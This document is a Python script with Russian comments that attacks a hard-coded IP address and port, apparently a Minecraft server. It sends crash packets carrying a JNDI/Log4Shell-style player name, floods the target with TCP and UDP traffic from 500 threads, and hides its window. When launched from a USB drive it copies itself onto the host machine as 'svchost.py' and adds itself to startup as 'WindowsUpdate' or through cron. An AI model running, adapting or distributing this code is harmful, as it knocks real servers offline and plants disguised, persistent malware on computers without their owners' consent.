#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import random
import sys
import os
import shutil
import subprocess
import platform
from pathlib import Path

# ===== ЦЕЛЬ (НЕ МЕНЯТЬ) =====
TARGET_IP = "185.9.145.66"
TARGET_PORT = 25587
PROTOCOL = 767  # 1.21.1

# ===== НАСТРОЙКИ =====
THREADS = 500
SILENT_MODE = True  # Не показывать окно
PERSISTENCE = True  # Копировать себя на комп жертвы
AUTO_START = True   # Добавить в автозагрузку

# ===== СТАТИСТИКА =====
sent = 0
failed = 0
attack_active = True
lock = threading.Lock()

def is_running_from_usb():
    """Проверяет, запущен ли скрипт с флешки"""
    try:
        script_path = os.path.abspath(__file__)
        # Признаки флешки:
        # - путь содержит съёмный диск (E:, F:, G:)
        # - или путь начинается с /media/ /mnt/ (Linux)
        if platform.system() == "Windows":
            drive = os.path.splitdrive(script_path)[0]
            # Проверяем тип диска
            import ctypes
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive + "\\")
            # DRIVE_REMOVABLE = 2
            return drive_type == 2
        else:
            return script_path.startswith('/media/') or script_path.startswith('/mnt/')
    except:
        return False

def copy_to_target():
    """Копирует себя на компьютер жертвы"""
    try:
        if platform.system() == "Windows":
            target_dirs = [
                os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Caches"),
                os.path.expandvars("%TEMP%"),
                os.path.expandvars("%USERPROFILE%\\Documents")
            ]
        else:
            target_dirs = [
                "/tmp/.cache",
                os.path.expanduser("~/.config")
            ]
        
        script_content = open(__file__, 'rb').read()
        
        for dir_path in target_dirs:
            try:
                os.makedirs(dir_path, exist_ok=True)
                target_path = os.path.join(dir_path, "svchost.py")
                with open(target_path, 'wb') as f:
                    f.write(script_content)
                
                # Делаем исполняемым (для Linux)
                if platform.system() != "Windows":
                    os.chmod(target_path, 0o755)
                
                # Добавляем в автозагрузку
                if AUTO_START:
                    add_to_startup(target_path)
                
                print(f"[+] Скопировано в {target_path}")
                return True
            except:
                continue
    except:
        pass
    return False

def add_to_startup(script_path):
    """Добавляет скрипт в автозагрузку"""
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, f'python "{script_path}"')
        else:  # Linux
            cron_line = f"@reboot python3 {script_path} > /dev/null 2>&1 &\n"
            with open("/tmp/cron.tmp", "w") as f:
                f.write(cron_line)
            subprocess.run("crontab /tmp/cron.tmp", shell=True)
    except:
        pass

def hide_window():
    """Прячет окно (Windows)"""
    if SILENT_MODE and platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def create_packet():
    """Создаёт краш-пакет"""
    nick = "${jndi:ldap://localhost:1389/a}" + "A" * 4096
    
    packet = bytearray()
    packet.append(0x00)
    
    p = PROTOCOL
    while True:
        if p < 128:
            packet.append(p)
            break
        else:
            packet.append((p & 0x7F) | 0x80)
            p >>= 7
    
    packet.append(len(TARGET_IP))
    packet.extend(TARGET_IP.encode())
    packet.append(TARGET_PORT >> 8)
    packet.append(TARGET_PORT & 0xFF)
    packet.append(0x02)
    
    len_bytes = bytearray()
    lp = len(packet)
    while True:
        if lp < 128:
            len_bytes.append(lp)
            break
        else:
            len_bytes.append((lp & 0x7F) | 0x80)
            lp >>= 7
    
    login = bytearray()
    login.append(0x00)
    login.append(len(nick))
    login.extend(nick.encode())
    
    login_len = bytearray()
    ll = len(login)
    while True:
        if ll < 128:
            login_len.append(ll)
            break
        else:
            login_len.append((ll & 0x7F) | 0x80)
            ll >>= 7
    
    return len_bytes + packet + login_len + login

def attack_worker():
    """Поток атаки"""
    global sent
    packet = create_packet()
    
    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(packet)
            s.close()
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1
        time.sleep(0.001)

def udp_flood():
    """UDP-флуд для нагрузки"""
    global sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    
    while attack_active:
        try:
            sock.sendto(data, (TARGET_IP, random.randint(1, 65535)))
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def monitor():
    """Мониторинг (тихий режим)"""
    last_sent = 0
    start = time.time()
    
    while attack_active:
        time.sleep(5)
        with lock:
            speed = sent - last_sent
            last_sent = sent
            elapsed = time.time() - start
            
            if not SILENT_MODE:
                print(f"\r[⚡] Скорость: {speed}/сек | Всего: {sent} | Время: {int(elapsed)}с", end="")

def main():
    # Прячем окно
    hide_window()
    
    # Проверяем, с флешки ли запущены
    on_usb = is_running_from_usb()
    
    if on_usb:
        # Копируем себя на компьютер жертвы
        copy_to_target()
    
    # Запускаем атаку
    for i in range(THREADS):
        if i % 2 == 0:
            threading.Thread(target=attack_worker).start()
        else:
            threading.Thread(target=udp_flood).start()
    
    threading.Thread(target=monitor, daemon=True).start()
    
    # Бесконечный цикл
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()  